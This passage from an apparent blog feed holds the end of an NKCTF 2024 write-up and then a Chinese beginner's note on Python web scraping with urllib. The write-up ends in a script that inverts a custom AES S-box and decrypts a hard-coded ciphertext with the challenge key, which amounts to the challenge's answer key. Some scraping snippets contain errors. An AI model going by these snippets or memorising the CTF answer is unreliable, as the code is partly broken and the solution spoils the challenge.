punctuation">,</span> <span class="token number">0x35</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0x14</span><span class="token punctuation">,</span> <span class="token number">0x5D</span><span class="token punctuation">,</span> <span class="token number">0x51</span><span class="token punctuation">,</span> <span class="token number">0xD8</span><span class="token punctuation">,</span> <span class="token number">0xB5</span><span class="token punctuation">,</span> <span class="token number">0xFE</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x96</span><span class="token punctuation">,</span> <span class="token number">0x93</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0xB6</span><span class="token punctuation">,</span>             <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x0D</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x80</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0xFF</span><span class="token punctuation">,</span> <span class="token number">0xA3</span><span class="token punctuation">,</span> <span class="token number">0xDD</span><span class="token punctuation">,</span> <span class="token number">0x72</span><span class="token punctuation">,</span> <span class="token number">0x05</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0xBF</span><span class="token punctuation">,</span> <span class="token number">0x0E</span><span class="token punctuation">,</span> <span class="token number">0x26</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x1F</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0xE5</span><span class="token punctuation">,</span>             <span class="token number">0xDC</span><span class="token punctuation">,</span> <span class="token number">0xF2</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0x50</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x85</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">,</span> <span class="token number">0x39</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0xCA</span><span class="token punctuation">,</span> <span class="token number">0xED</span><span class="token punctuation">,</span> <span class="token number">0x9C</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x23</span><span class="token punctuation">,</span> <span class="token number">0x1A</span><span class="token punctuation">,</span> <span class="token number">0xF0</span><span class="token punctuation">,</span>             <span class="token number">0x32</span><span class="token punctuation">,</span> <span class="token number">0x58</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0x65</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x6F</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xBE</span><span class="token punctuation">,</span> <span class="token number">0x3F</span><span class="token punctuation">,</span> <span class="token number">0x6D</span><span class="token punctuation">,</span> <span class="token number">0x11</span><span class="token punctuation">,</span> <span class="token number">0x00</span><span class="token punctuation">,</span> <span class="token number">0xAD</span><span class="token punctuation">,</span> <span class="token number">0x5F</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0x81</span><span class="token punctuation">,</span> <span class="token number">0x25</span><span class="token punctuation">,</span> <span class="token number">0xA8</span><span class="token punctuation">,</span>             <span class="token number">0xA0</span><span class="token punctuation">,</span> <span class="token number">0x9A</span><span class="token punctuation">,</span> <span class="token number">0xF6</span><span class="token punctuation">,</span> <span class="token number">0xF7</span><span class="token punctuation">,</span> <span class="token number">0x5E</span><span class="token punctuation">,</span> <span class="token number">0x99</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0x2E</span><span class="token punctuation">,</span> <span class="token number">0x4B</span><span class="token punctuation">,</span> <span class="token number">0xF9</span><span class="token punctuation">,</span> <span class="token number">0x3B</span><span class="token punctuation">,</span> <span class="token number">0x02</span><span class="token punctuation">,</span> <span class="token number">0x7A</span><span class="token punctuation">,</span> <span class="token number">0xB9</span><span class="token punctuation">,</span> <span class="token number">0x5C</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0x1C</span><span class="token punctuation">,</span>             <span class="token number">0xDB</span><span class="token punctuation">,</span> <span class="token number">0x01</span><span class="token punctuation">,</span> <span class="token number">0x7D</span><span class="token punctuation">,</span> <span class="token number">0xFD</span><span class="token punctuation">]</span>new_contrary_sbox <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">256</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    line <span class="token operator">=</span> <span class="token punctuation">(</span>new_s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xf0</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">4</span>    rol <span class="token operator">=</span> new_s_box<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&amp;</span> <span class="token number">0xf</span>    new_contrary_sbox<span class="token punctuation">[</span><span class="token punctuation">(</span>line <span class="token operator">*</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">+</span> rol<span class="token punctuation">]</span> <span class="token operator">=</span> i<span class="token keyword">print</span><span class="token punctuation">(</span>new_contrary_sbox<span class="token punctuation">)</span>IInput <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'B0CC93EAE92FEF5699396E023B4F9E42'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>IInput<span class="token punctuation">)</span>Cipher_Key <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">(</span><span class="token string">b'user01_nkctf2024'</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>Cipher_Key<span class="token punctuation">)</span>Out <span class="token operator">=</span> IAES<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>IAES<span class="token punctuation">(</span>IInput<span class="token punctuation">,</span> Cipher_Key<span class="token punctuation">,</span>new_contrary_sbox<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>Out<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>爬虫笔记</title>
      <link href="/2024/03/13/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/"/>
      <url>/2024/03/13/%E7%88%AC%E8%99%AB%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="introduction"><a class="markdownIt-Anchor" href="#introduction"></a> <strong>introduction</strong></h1><p>学习python爬虫的笔记</p><h1 id="basics"><a class="markdownIt-Anchor" href="#basics"></a> <strong>basics</strong></h1><h2 id="web-basics"><a class="markdownIt-Anchor" href="#web-basics"></a> <strong>Web-basics</strong></h2><h3 id="url"><a class="markdownIt-Anchor" href="#url"></a> <strong>url</strong></h3><blockquote><p>scheme://[username:password@]hostname[:port][/path][;parameters][?query][#fragment]</p><ul><li><strong>scheme</strong>:协议，eg：http;https;ftp  也称作protocol</li><li>username,password:用户,密码  有的url需要提供用户名和密码才能访问</li><li><strong>hostname</strong>:IP</li><li><strong>port</strong>:端口</li><li><strong>path</strong>路径，资源在服务器中的指定地址</li><li>parameters:参数不常用</li><li>query:查询  查询某种资源</li><li>fragment:片段  对资源描述的部分补充,相当于资源内部的书签:可用作单页面路由或者HTML锚点</li></ul></blockquote><h3 id="httphttps"><a class="markdownIt-Anchor" href="#httphttps"></a> <strong>http,https</strong></h3><p>http1.0/http1.1:目前的正式标准广泛使用，持久连接，节约宽带，管道机制，分块传输编码</p><p>http2.0:多路复用，服务器推送，头信息压缩，二进制协议，逐渐覆盖市场</p><p>https:http下加入SSL层进行加密，主打一个安全</p><h3 id="request"><a class="markdownIt-Anchor" href="#request"></a> <strong>request</strong></h3><h4 id="request-method"><a class="markdownIt-Anchor" href="#request-method"></a> <strong>request-method</strong></h4><ul><li><strong>GET</strong> 请求中的参数包含在url中，数据可以在url中看到，最多提交1024字节</li><li><strong>POST</strong> 请求的URL不会包含这些数据，数据通过表达传输，包含在请求体中</li><li>HEAD 类似于GET请求，但是返回的响应中没有具体内容，用于获取报头</li><li>PUT 用客户端传向服务器的数据取代指定文档中的内容</li><li>DELETE 请求服务器删除指定的页面</li><li>CONNECT 把服务器当跳板，让服务器代替客户端访问其他网页</li><li>OPTIONS 允许客户端查看服务器性能</li><li>TRACE 回显服务器收到的请求，主要用于测试或者诊断</li></ul><h4 id="request-head"><a class="markdownIt-Anchor" href="#request-head"></a> <strong>request-head</strong></h4><blockquote><p>Accept:请求报头域，用于指定客户端可以接受哪些类型信息</p><p>Accept-Language:指定客户端可接受的语言类型</p><p>Accept-Encoding:指定客户端可解搜的内容编码</p><p>Host: 用于指定请求资源的主机IP和端口号</p><p>Cookie: 或写作Cookies，为了辨别用户，进行会话跟踪而存储在用户本地的数据,主要功能是维持当前访问会话，保存登录信息</p><p>Referer: 用于标识请求从哪个页面发过来的，用作来源统计或者防盗链处理</p><p>User-Agent:UA头，使服务器识别客户端使用的操作系统及版本，浏览器及版本等信息，爬虫凭此可伪装成浏览器</p><p>Content-Type: 互联网媒体类型，text/html代表html格式，image/git代表gif图片，application/json 代表json类型</p><p>Upgrade-Insecure-Requests:一个请求首部，用来向服务器端发送信号，表示客户端优先选择加密及带有身份验证的响应，并且它可以成功处理 upgrade-insecure-requests CSP (en-US) 指令。</p><p>Sec-Fetch-*:<a href="https://juejin.cn/post/6888119172144824327">Sec-Fetch-*请求头，了解下? - 掘金 (juejin.cn)</a></p></blockquote><p>eg：访问baidu.com的请求头</p><p><img src="https://s2.loli.net/2024/03/13/LyuRpMGgJ6lZTs1.png" alt="" / loading="lazy"></p><h4 id="request-body"><a class="markdownIt-Anchor" href="#request-body"></a> <strong>request-body</strong></h4><blockquote><p>GET:请求体为空</p><p>POST: 数据在请求体中，数据以内容表单数据的形式提交给服务器。requestheader的Content-Type 为 application/x-www-form-urlencoded POST提交数据方式为:表达数据  multipart/form-data 表单文件上传 application/json 序列化json数据 text/xml XML表单数据</p></blockquote><h3 id="response"><a class="markdownIt-Anchor" href="#response"></a> <strong>response</strong></h3><h4 id="status-code"><a class="markdownIt-Anchor" href="#status-code"></a> <strong>status-code</strong></h4><pre class="line-numbers language-none"><code class="language-none">2XX 成功200 ok（请求成功）204 no content （请求成功，但是没有结果返回）206 partial content （客户端请求一部分资源，服务端成功响应，返回一范围资源）3XX 重定向301 move permanently （永久性重定向）302 found （临时性重定向）303 see other （示由于请求对应的资源存在着另一个 URI，应使用 GET方法定向获取请求的资源）304 not modified （表示在客户端采用带条件的访问某资源时，服务端找到了资源，但是这个请求的条件不符合。跟重定向无关）307 temporary redirect （跟302一个意思）4XX 客户端错误400 bad request （请求报文存在语法错误）401 unauthorized （需要认证（第一次返回）或者认证失败（第二次返回））403 forbidden （请求被服务器拒绝了）404 not found （服务器上无法找到请求的资源）5XX 服务器错误500 internal server error （服务端执行请求时发生了错误）503 service unavailable （服务器正在超负载或者停机维护，无法处理请求）<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其他不常见的请见<a href="https://juejin.cn/post/6844904202863394830">HTTP 状态码 - 掘金 (juejin.cn)</a></p><h4 id="response-header"><a class="markdownIt-Anchor" href="#response-header"></a> <strong>response-header</strong></h4><blockquote><p>Data: 标识响应产生的时间</p><p>Last-Modified: 指定资源的最后修改时间</p><p>Content-Encoding: 指定响应内容的编码</p><p>Server: 包含服务器的信息，例如名称和版本号</p><p>Content-Type: 文档类型，指定返回的数据是什么类型text/html:html文档，application/x-javascript返回javascript类型，image/jpeg返回图片</p><p>Set-Cookie:设置Cookie,告诉浏览器需要将此内容放在Cooki中</p><p>Expires:用于指定响应的过期时间</p></blockquote><h4 id="response-body"><a class="markdownIt-Anchor" href="#response-body"></a> <strong>response-body</strong></h4><p>即响应的正文数据，是我们需要爬取的内容如图下<img src="https://s2.loli.net/2024/03/13/AgvElbUamZCHrqD.png" alt="" / loading="lazy"></p><h2 id="urllib"><a class="markdownIt-Anchor" href="#urllib"></a> <strong>urllib</strong></h2><p>llib 包 包含以下几个模块：</p><ul><li><strong>urllib.request</strong> - <strong>打开和读取 URL</strong>。</li><li>urllib.error - 包含 urllib.request 抛出的异常。</li><li><strong>urllib.parse</strong> - <strong>解析 URL</strong>。</li><li>urllib.robotparser - 解析 robots.txt 文件。</li></ul><h3 id="urllibrequest"><a class="markdownIt-Anchor" href="#urllibrequest"></a> <strong>urllib.request</strong></h3><blockquote><pre class="line-numbers language-none"><code class="language-none">urllib.request.urlopen(url, data&#x3D;None, [timeout, ]*, cafile&#x3D;None, capath&#x3D;None, cadefault&#x3D;False, context&#x3D;None)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>url</strong>：url 地址。</li><li><strong>data</strong>：发送到服务器的其他数据对象，默认为 None。</li><li><strong>timeout</strong>：设置访问超时时间。</li><li><strong>cafile 和 capath</strong>：cafile 为 CA 证书， capath 为 CA 证书的路径，使用 HTTPS 需要用到。</li><li><strong>cadefault</strong>：已经被弃用。</li><li><strong>context</strong>：ssl.SSLContext类型，用来指定 SSL 设置。</li></ul></blockquote><p>模拟网页打开</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>requestresponse<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'www.baidu.com'</span><span class="token punctuation">)</span><span class="token comment">#打开一个网页，并返回网页源码</span>response<span class="token punctuation">.</span>status <span class="token comment">#返回网页响应状态码</span>response<span class="token punctuation">.</span>getheaders<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#返回网页的响应头信息</span>response<span class="token punctuation">.</span>getheaders<span class="token punctuation">(</span><span class="token string">'Server'</span><span class="token punctuation">)</span><span class="token comment">#返回响应头信息'Server'的信息</span><span class="token comment">#headers可获取的值是响应头的所有元素,eg:Content-Type:指定服务器返回的响应内容类型。</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token comment">#输出utf8编码的源代码</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">300</span><span class="token punctuation">)</span><span class="token comment">#指定输出的长度</span>response<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#读取一行内容</span>response<span class="token punctuation">.</span>readlines<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#读取全部内容，返回一个列表，每一行是列表的元素</span>encoded_url<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>quote<span class="token punctuation">(</span><span class="token string">'www.baidu.com'</span><span class="token punctuation">)</span><span class="token comment">#编码，unquote就是url解码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>模拟头部信息则需要urllib.request.Request类</p><blockquote><pre class="line-numbers language-none"><code class="language-none">class urllib.request.Request(url, data&#x3D;None, headers&#x3D;&#123;&#125;, origin_req_host&#x3D;None, unverifiable&#x3D;False, method&#x3D;None)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>url</strong>：url 地址。</li><li><strong>data</strong>：发送到服务器的其他数据对象，默认为 None。</li><li><strong>headers</strong>：HTTP 请求的头部信息，字典格式。</li><li><strong>origin_req_host</strong>：请求的主机地址，IP 或域名。</li><li><strong>unverifiable</strong>：很少用整个参数，用于设置网页是否需要验证，默认是False。。</li><li><strong>method</strong>：请求方法， 如 GET、POST、DELETE、PUT等。</li></ul></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parseheader <span class="token operator">=</span> <span class="token punctuation">&#123;</span>    <span class="token string">'User-Agent'</span><span class="token punctuation">:</span><span class="token string">'Mozilla/5.0 (X11; Fedora; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36'</span><span class="token punctuation">&#125;</span>   <span class="token comment">#头部信息</span>url<span class="token operator">=</span><span class="token string">'www.baidu.com/?s='</span>keyword<span class="token operator">=</span><span class="token string">'Python教程'</span>url_all<span class="token operator">=</span>url<span class="token operator">+</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>quote<span class="token punctuation">(</span>keyword<span class="token punctuation">)</span>request<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url_all<span class="token punctuation">,</span>headers<span class="token operator">=</span>header<span class="token punctuation">)</span><span class="token comment">#构造请求头</span>response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#输出响应体</span>url <span class="token operator">=</span> <span class="token string">'https://www.runoob.com/try/py3/py3_urllib_test.php'</span>  <span class="token comment"># 提交到表单页面</span>data <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'name'</span><span class="token punctuation">:</span><span class="token string">'RUNOOB'</span><span class="token punctuation">,</span> <span class="token string">'tag'</span> <span class="token punctuation">:</span> <span class="token string">'菜鸟教程'</span><span class="token punctuation">&#125;</span>   <span class="token comment"># 提交数据</span>data<span class="token operator">=</span>urllib<span class="token punctuation">.</span>parse<span class="token punctuation">.</span>urlencode<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span>request<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>Request<span class="token punctuation">(</span>url<span class="token punctuation">,</span>data<span class="token punctuation">,</span>header，method<span class="token operator">=</span><span class="token string">'POST'</span><span class="token punctuation">)</span><span class="token comment">#请求处理</span>response<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>request<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#输出响应体</span>req<span class="token punctuation">.</span>add_header<span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token string">'wwww'</span><span class="token punctuation">)</span><span class="token comment">#添加文件头</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="urlliberror"><a class="markdownIt-Anchor" href="#urlliberror"></a> <strong>urllib.error</strong></h3><p>urllib.error 模块为 urllib.request 所引发的异常定义了异常类，基础异常类是 URLError。</p><p>urllib.error 包含了两个方法，URLError 和 HTTPError。</p><p>URLError 是 OSError 的一个子类，用于处理程序在遇到问题时会引发此异常（或其派生的异常），包含的属性 reason 为引发异常的原因。</p><p>HTTPError 是 URLError 的一个子类，用于处理特殊 HTTP 错误例如作为认证请求的时候，包含的属性 code 为 HTTP 的状态码， reason 为引发异常的原因，headers 为导致 HTTPError 的特定 HTTP 请求的 HTTP 响应头。</p><p>对不存在的网页抓取并处理异常:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>request<span class="token keyword">import</span> urllib<span class="token punctuation">.</span>errormyurl<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span><span class="token string">'www.baidu.com/404.html'</span><span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    myurl2<span class="token operator">=</span>urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>myurl<span class="token punctuation">)</span><span class="token keyword">except</span> urllib<span class="token punctuation">.</span>error<span class="token punctuation">.</span>HTTPError <span class="token keyword">as</span> e<span class="token punctuation">:</span>    <span class="token keyword">if</span> e<span class="token punctuation">.</span>code<span class="token operator">==</span><span class="token number">404</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token number">404</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="urllibparse"><a class="markdownIt-Anchor" href="#urllibparse"></a> <strong>urllib.parse</strong></h3><p>解析url</p><blockquote><p>urllib.parse.urlparse(urlstring, scheme=‘’, allow_fragments=True)</p><ul><li>urlstring:url地址</li><li>scheme:协议类型</li><li>allow_fragments: 是否忽略fragment</li></ul></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlparseo <span class="token operator">=</span> urlparse<span class="token punctuation">(</span><span class="token string">"https://www.runoob.com/?s=python+%E6%95%99%E7%A8%8B"</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span><span class="token comment">#ParseResult(scheme='https', netloc='www.runoob.com', path='/', params='', query='s=python+%E6%95%99%E7%A8%8B', fragment='')</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li>urllib.parse.urlunparse:用于构造url</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> urllib<span class="token punctuation">.</span>parsedata<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">'https'</span><span class="token punctuation">,</span><span class="token string">'www.baidu.com'</span><span class="token punctuation">,</span><span class="token string">'index.html'</span><span class="token punctuation">,</span><span class="token string">'user'</span><span class="token punctuation">,</span><span class="token string">'a=6'</span><span class="token punctuation">,</span><span class="token string">'comment'</span><span class="token punctuation">]</span>urllib<span class="token punctuation">.</span>unparse<span class="token punctuation">(</span>data<span class="token punctuation">)</span><span class="token comment">#https://www.baidu.com/index.html;user?a=6#comment</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><ul><li><p>urllib.parse.urlsplit:类型与urlparse 不过不单独解析params，合并到path</p></li><li><p>urllib.parse.urljoin:提供一个base_url作为第一个参数，将新的连接作为第二个参数，urljoin会分析base_url的scheme,netloc,path三个内容，对新连接确实的部分进行补充，然后返回结果</p><p>baseurl提供scheme,netloc,path若新连接不存在这三项，则补充，否则使用新链接的</p></li><li><p>urllib.parse.encode:构造get请求</p></li><li><p>urllib.parse.parse_qs 反序列化</p></li><li><p>urllib.parse.parse_qsl  参数转元组组成的列表</p></li><li><p>urllib.parse.quote 转化url编码格式</p></li><li><p>urllib.parse.unquote(url)  将url解码</p></li></ul><h3 id="urllibrobotparser"><a class="markdownIt-Anchor" href="#urllibrobotparser"></a> <strong>urllib.robotparser</strong></h3><p>不常用</p><blockquote><p>class urllib.robotparser.RobotFileParser(url=‘’)</p></blockquote><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">import</span> urllib<span class="token punctuation">.</span>robotparser<span class="token operator">>></span><span class="token operator">></span> rp <span class="token operator">=</span> urllib<span class="token punctuation">.</span>robotparser<span class="token punctuation">.</span>RobotFileParser<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> rp<span class="token punctuation">.</span>set_url<span class="token punctuation">(</span><span class="token string">"http://www.musi-cal.com/robots.txt"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> rp<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> rrate <span class="token operator">=</span> rp<span class="token punctuation">.</span>request_rate<span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> rrate<span class="token punctuation">.</span>requests<span class="token number">3</span><span class="token operator">>></span><span class="token operator">></span> rrate<span class="token punctuation">.</span>seconds<span class="token number">20</span><span class="token operator">>></span><span class="token operator">></span> rp<span class="token punctuation">.</span>crawl_delay<span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">)</span><span class="token number">6</span><span class="token operator">>></span><span class="token operator">></span> rp<span class="token punctuation">.</span>can_fetch<span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"http://www.musi-cal.com/cgi-bin/search?city=San+Francisco"</span><span class="token punctuation">)</span><span class="token boolean">False</span><span class="token operator">>></span><span class="token operator">></span> rp<span class="token punctuation">.</span>can_fetch<span class="token punctuation">(</span><span class="token string">"*"</span><span class="token punctuation">,</span> <span class="token string">"http://www.musi-cal.com/"</span><span class="token punctuation">)</span><span class="token boolean">True</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="handler"><a class="markdownIt-Anchor" href="#handler"></a> <strong>handler</strong></h3><p><img src="https://s2.loli.net/2024/03/13/yWVxA3bJfXZIp5l.png" alt="" / loading="lazy"></p><p><img src="https://s2.loli.net/2024/03/13/8kqGnfgsecl5pYt.png" alt="" / loading="lazy"></p><ul><li><p>设置代理</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>error <span class="token keyword">import</span> URLError<span class="token keyword">from</span> urllib<span class="token punctuation">.</span>request <span class="token keyword">import</span> ProxyHandler<span class="token punctuation">,</span>build_opener<span class="token comment">#Request相当于一个特殊的opener类</span>proxy_handler<span class="token operator">=</span>ProxyHandler<span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token string">'http'</span><span class="token punctuation">:</span><span class="token string">'http://127.0.0.1:8080'</span><span class="token punctuation">,</span>    <span class="token string">'https'</span><span class="token punctuation">:</span><span class="token string">'https://127.0.0.1:8080'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>opener<span class="token operator">=</span>build_opener<span class="token punctuation">(</span>proxy_handler<span class="token punctuation">)</span><span class="token keyword">try</span><span class="token punctuation">:</span>    response<span class="token operator">=</span>opener<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'https://www.baidu.com'</span><span class="token punctuation">)</span>   <span class="token comment">#opener提供open方法，与urlopen如出一辙</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>response<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">except</span> 